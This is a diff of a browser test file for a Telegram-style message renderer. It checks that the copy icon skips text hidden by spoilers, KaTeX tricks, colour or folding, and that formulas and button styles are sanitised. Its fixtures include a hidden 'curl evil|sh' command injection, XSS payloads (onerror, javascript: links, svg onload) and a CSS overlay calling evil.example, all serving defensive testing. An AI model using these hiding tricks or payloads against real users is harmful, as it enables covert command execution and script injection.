@@ -18,9 +18,10 @@ const page = await browser.newPage();
 const pageErrors = [];
 page.on('pageerror', (e) => pageErrors.push(e.message));
 page.on('dialog', (d) => { pageErrors.push('dialog: ' + d.message()); d.dismiss(); });
-// tg.css gives the slideshow its layout, so scrolling and dragging it can be checked
+// tg.css gives the slideshow its layout, so scrolling and dragging it can be checked; KaTeX's styles lay a formula out
+// as every page of the studio does, so where it puts its text can be checked too
 await page.setContent('<!doctype html><meta charset="utf-8"><body><div id="out" class="tg-preview"></div></body>');
-await page.addStyleTag({ path: stat('tg.css') });
+for (const f of ['vendor/katex/katex.min.css', 'tg.css']) await page.addStyleTag({ path: stat(f) });
 for (const f of ['vendor/markdown-it.min.js', 'vendor/katex/katex.min.js', 'render.js']) await page.addScriptTag({ path: stat(f) });
 
 // render a post into the live document, wait for image errors to fire, return the body's HTML
@@ -646,6 +647,71 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
     return [closed, copy()];
   });
   check('the copy icon leaves out a closed spoiler and copies an open one whole', JSON.stringify(spoiler) === JSON.stringify(['ls', 'ls; curl evil|sh']), JSON.stringify(spoiler));
+  // a spoiler in a spoiler: its text is seen only when both are open
+  await render({ html: '<pre>ls<tg-spoiler> a<tg-spoiler>; curl <a href="https://evil.example/">evil</a>|sh</tg-spoiler></tg-spoiler></pre>' });
+  const nested = await page.evaluate(async () => {
+    const [outer, inner] = /** @type {HTMLElement[]} */ ([...document.querySelectorAll('#out .tg-spoiler')]);
+    const copy = async (o, i) => {
+      outer.classList.toggle('tg-spoiler-open', o);
+      inner.classList.toggle('tg-spoiler-open', i);
+      await new Promise((r) => setTimeout(r, 300)); // a spoiler's transition
+      window.__copied = null;
+      /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
+      return window.__copied;
+    };
+    return [await copy(true, false), await copy(false, true), await copy(true, true)];
+  });
+  check('the copy icon leaves out a spoiler in a spoiler unless both are open', JSON.stringify(nested) === JSON.stringify(['ls a', 'ls', 'ls a; curl evil|sh']), JSON.stringify(nested));
+
+  // what a formula moves out of the code box, what a folded quote cuts off after its third line, the slides not in
+  // view and text a formula draws in the colour of what is behind it are not seen, so not copied (issue #206). What
+  // the code box scrolls to, a long line, is seen
+  const moved = [
+    ['<pre>ls<tg-math>\\kern{-300em}\\text{; curl evil|sh}</tg-math></pre>', 'ls'],
+    ['<pre>ls<tg-math>\\smash{\\raisebox{300em}{; curl evil|sh}}</tg-math></pre>', 'ls'],
+    ['<pre>ls<tg-math>\\mathllap{\\kern{-200em}\\text{; curl evil|sh}}</tg-math></pre>', 'ls'],
+    ['<pre>ls<tg-math-block>\\mathllap{\\kern{-200em}\\text{; curl evil|sh}}</tg-math-block></pre>', 'ls'],
+    ['<pre>ls<tg-math>\\color{white}{; curl evil|sh}</tg-math></pre>', 'ls'],
+    ['<pre>ls<tg-math>\\colorbox{black}{\\textcolor{black}{; curl evil|sh}}</tg-math></pre>', 'ls'],
+    ['<pre>ls<blockquote expandable>1\n2\n3\n4\n; curl evil|sh</blockquote></pre>', 'ls\n1\n2\n3\n'],
+    ['<pre>ls<blockquote expandable>1<br>2<br>3<br>4<br>; curl evil|sh</blockquote></pre>', 'ls\n1\n2\n3\n'],
+    ['<pre>ls<tg-slideshow><b>один</b><b>; curl evil|sh</b></tg-slideshow></pre>', 'ls\nодин'],
+    ['<pre>ls' + ' '.repeat(300) + '; длинная строка</pre>', 'ls' + ' '.repeat(300) + '; длинная строка'],
+    ['<pre>a <tg-math>\\color{gray}{b}+\\colorbox{black}{\\textcolor{white}{c}}</tg-math></pre>', 'a b+c'],
+  ];
+  const unseen = [];
+  for (const [html, want] of moved) {
+    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
+      const got = await copies(rm);
+      if (got.length !== 1 || got[0].copied !== want) unseen.push(`${JSON.stringify(rm)}: ${JSON.stringify(got[0]?.copied)}`);
+    }
+  }
+  check('the copy icon leaves out what a formula moves out of the code, a folded quote cuts off, other slides and text in the colour of its background', unseen.length === 0, unseen.join('; '));
+  // a post written right to left: its code scrolls to the left, and that is seen too
+  const long = 'ls' + ' '.repeat(300) + '; длинная строка';
+  const rtl = await copies({ html: `<pre>${long}</pre><pre>שלום${' '.repeat(300)}עולם</pre>`, is_rtl: true });
+  check('the copy icon copies a long line of a right-to-left post whole', JSON.stringify(rtl.map((c) => c.copied)) === JSON.stringify([long, 'שלום' + ' '.repeat(300) + 'עולם']), JSON.stringify(rtl.map((c) => c.copied)));
+  // unfolded, turned to the next slide, on the night theme: seen, so copied
+  await render({ html: '<pre>ls<blockquote expandable>1\n2\n3\n4\n5</blockquote><tg-slideshow><b>один</b><b>два</b></tg-slideshow><tg-math>\\color{white}{x}</tg-math></pre>' });
+  const shownNow = await page.evaluate(async () => {
+    const copy = () => { window.__copied = null; /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click(); return window.__copied; };
+    const before = copy();
+    /** @type {HTMLElement} */ (document.querySelector('#out .tg-expandable')).click();
+    const track = /** @type {HTMLElement} */ (document.querySelector('#out .tg-slides'));
+    track.scrollLeft = track.clientWidth;
+    await new Promise((r) => requestAnimationFrame(() => r(null)));
+    const after = copy();
+    document.getElementById('out')?.classList.add('tg-dark');
+    const dark = copy();
+    document.getElementById('out')?.classList.remove('tg-dark');
+    return [before, after, dark];
+  });
+  check('the copy icon copies an unfolded quote whole, the slide in view and white on the night theme',
+    JSON.stringify(shownNow) === JSON.stringify(['ls\n1\n2\n3\n\nодин', 'ls\n1\n2\n3\n4\n5\nдва', 'ls\n1\n2\n3\n4\n5\nдва\nx']), JSON.stringify(shownNow));
+  // a fraction is read from the top, as it is seen: \frac{a}{b} was copied as «ba» (issue #206)
+  const frac = [];
+  for (const rm of [{ html: '<pre>x=<tg-math>\\frac{a}{b}</tg-math></pre>' }, { blocks: [{ type: 'pre', text: ['x=', { type: 'mathematical_expression', expression: '\\frac{a}{b}' }] }] }]) frac.push((await copies(rm))[0]?.copied);
+  check('the copy icon copies a fraction from the top down', JSON.stringify(frac) === JSON.stringify(['x=ab', 'x=ab']), JSON.stringify(frac));
 }
 {
   // a class name made of a string of the post is one word, else there is none (review of #202): «x tg-cell-empty» put
@@ -664,6 +730,57 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   const srcs = await page.evaluate(() => ['upload:..', 'upload:.', 'upload:', 'upload:../api/check', 'upload:a/b.png', 'upload:a\\b.png', 'upload:a..b.png', 'upload:a.png']
     .map((m) => RichRender.mediaSrc(m, {})));
   check('upload: a name that is not one file has no preview', JSON.stringify(srcs) === JSON.stringify([null, null, null, null, null, null, '/media/a..b.png', '/media/a.png']), JSON.stringify(srcs));
+  // the colour of a button in html is its style attribute, as «В HTML» writes it (issue #206): a word that names a
+  // class, never CSS
+  const styled = await classes({ html: '<tg-button-row><tg-button data="a" style="primary">a</tg-button><tg-button data="b" style="danger">b</tg-button><tg-button data="c" style="x tg-cell-empty">c</tg-button><tg-button data="d" style="color:red;position:fixed;inset:0;background:url(https://evil.example/b.png)">d</tg-button></tg-button-row>' });
+  const css = await page.evaluate(() => [...document.querySelectorAll('#out [style]')].map((n) => n.getAttribute('style')));
+  check('html: the style of a button is its colour as one word, not CSS',
+    JSON.stringify(styled) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn tg-btn-primary', 'tg-btn tg-btn-danger', 'tg-btn', 'tg-btn']) && css.length === 0, JSON.stringify({ styled, css }));
+}
+{
+  // a closed spoiler hides what is in it, a spoiler open inside it too, and a closed spoiler in an open one hides its
+  // link, which has a colour of its own (review of #211)
+  await render({ html: '<p><tg-spoiler>a <tg-spoiler>b <a href="https://example.com/">ссылка</a></tg-spoiler></tg-spoiler></p>' });
+  const seen = await page.evaluate(async () => {
+    const [outer, inner] = /** @type {HTMLElement[]} */ ([...document.querySelectorAll('#out .tg-spoiler')]);
+    const link = /** @type {HTMLElement} */ (document.querySelector('#out .tg-spoiler a'));
+    const got = [];
+    for (const [o, i] of [[true, false], [false, true], [false, false], [true, true]]) {
+      outer.classList.toggle('tg-spoiler-open', o);
+      inner.classList.toggle('tg-spoiler-open', i);
+      await new Promise((r) => setTimeout(r, 300)); // a spoiler's transition
+      got.push(getComputedStyle(link).visibility);
+    }
+    return got;
+  });
+  check('a link in a spoiler in a spoiler is seen only when both are open', JSON.stringify(seen) === JSON.stringify(['hidden', 'hidden', 'hidden', 'visible']), JSON.stringify(seen));
+  // an unknown tag in an unknown tag has a frame of its own, from the third level on there is none (issue #198)
+  await render({ html: '<tg-x>a<tg-y>b<tg-z>c<tg-w>d</tg-w></tg-z></tg-y></tg-x>' });
+  const frames = await page.evaluate(() => [...document.querySelectorAll('#out .tg-unknown')].map((n) => getComputedStyle(n).outlineStyle));
+  check('an unknown tag in an unknown tag has its own frame, deeper ones have none', JSON.stringify(frames) === JSON.stringify(['dashed', 'dashed', 'none', 'none']), JSON.stringify(frames));
+}
+{
+  // a formula is its TeX: no tag in it is drawn, in html and in markdown (review of #211). Not in PAYLOADS: KaTeX's
+  // MathML for screen readers is a <math> of its own
+  const hostile = '<tg-math>a<img src=x onerror="window.__xss=1"><a href="javascript:window.__xss=1">l</a>\\href{javascript:window.__xss=1}{h}</tg-math><tg-math-block><svg onload="window.__xss=1"></svg><img src=x onerror="window.__xss=1">b</tg-math-block>';
+  const wrong = [];
+  for (const rm of [{ html: hostile }, { markdown: 'Формула ' + hostile }]) {
+    const r = await render(rm);
+    const got = await page.evaluate(async () => {
+      document.querySelectorAll('#out a, #out .tg-math, #out .tg-math-block').forEach((n) => /** @type {HTMLElement} */ (n).click());
+      await new Promise((r) => setTimeout(r, 50));
+      const outside = [...document.querySelectorAll('#out *')].filter((n) => !n.closest('.katex'));
+      return {
+        tags: outside.filter((n) => /^(img|a|svg)$/.test(n.localName)).map((n) => n.localName),
+        on: [...document.querySelectorAll('#out *')].filter((n) => [...n.attributes].some((a) => /^on/i.test(a.name))).map((n) => n.localName),
+        links: document.querySelectorAll('#out a[href]').length,
+        formulas: document.querySelectorAll('#out .katex').length,
+        xss: window.__xss,
+      };
+    });
+    if (r.xss || got.xss || got.tags.length || got.on.length || got.links || got.formulas !== 2) wrong.push(`${Object.keys(rm)[0]}: ${JSON.stringify(got)}`);
+  }
+  check('html and markdown: what a formula holds is its TeX, no tag of it is drawn', wrong.length === 0, wrong.join('; '));
 }
 
 // ---------- animation (GIF) ----------
@@ -706,15 +823,18 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
 // Not by a fixed limit, which a slow CI runner may miss: by how much the time grows with the input (as
 // tests/test_rich_limits.py::test_deep_html_is_checked_in_linear_time) or against the same post drawn a plain way
 {
-  /** the least of two runs, ms: drawing the post (render), its outline, or laying it out on the page once drawn (layout) */
+  /** the least of two runs, ms: drawing the post (render), its outline, laying it out on the page once drawn (layout),
+   * or copying its code block once laid out (copy) */
   const took = (what, rm) => page.evaluate(([what, rm]) => {
     const out = /** @type {HTMLElement} */ (document.getElementById('out'));
     const once = () => {
       out.replaceChildren();
       out.getBoundingClientRect();
-      const drawn = what === 'layout' ? RichRender.render({ rich_message: rm }, {}) : null;
+      const drawn = what === 'layout' || what === 'copy' ? RichRender.render({ rich_message: rm }, {}) : null;
+      if (drawn && what === 'copy') { out.append(drawn); out.getBoundingClientRect(); }
       const t = performance.now();
-      if (drawn) { out.append(drawn); out.getBoundingClientRect(); }
+      if (what === 'copy') /** @type {HTMLElement} */ (out.querySelector('.tg-pre-copy')).click();
+      else if (drawn) { out.append(drawn); out.getBoundingClientRect(); }
       else if (what === 'outline') RichRender.outline({ rich_message: rm });
       else RichRender.render({ rich_message: rm }, {});
       return performance.now() - t;
@@ -771,6 +891,10 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   // layout), and a closed spoiler in a closed spoiler its own blot under the outer one
   await asPlain('html: unknown tags in unknown tags over many lines', 'layout', { html: '<tg-x>'.repeat(512) + '<br>'.repeat(7000) }, { html: '<b>'.repeat(512) + '<br>'.repeat(7000) });
   await asPlain('html: spoilers in spoilers over many lines', 'layout', { html: '<tg-spoiler>'.repeat(512) + '<br>'.repeat(7000) }, { html: '<b>'.repeat(512) + '<br>'.repeat(7000) });
+  // what of the code is in view (issue #206): a range round each <br> was found by its place among the children of the
+  // code, from the first one each time; a line that crosses the edge of a box is looked through by halves
+  await linear('copy: lines of code from blocks', 'copy', (n) => ({ blocks: [{ type: 'pre', text: 'a b\n'.repeat(n) }] }), 1500);
+  await linear('copy: a slide of lines wider than it in code', 'copy', (n) => ({ html: '<pre><tg-slideshow><b>' + ('x'.repeat(60) + '\n').repeat(n) + '</b></tg-slideshow></pre>' }), 150);
 }
 
 check('no script ran and no page errors', (await page.evaluate(() => window.__xss)) === 0 && pageErrors.length === 0, pageErrors.join(' | '));
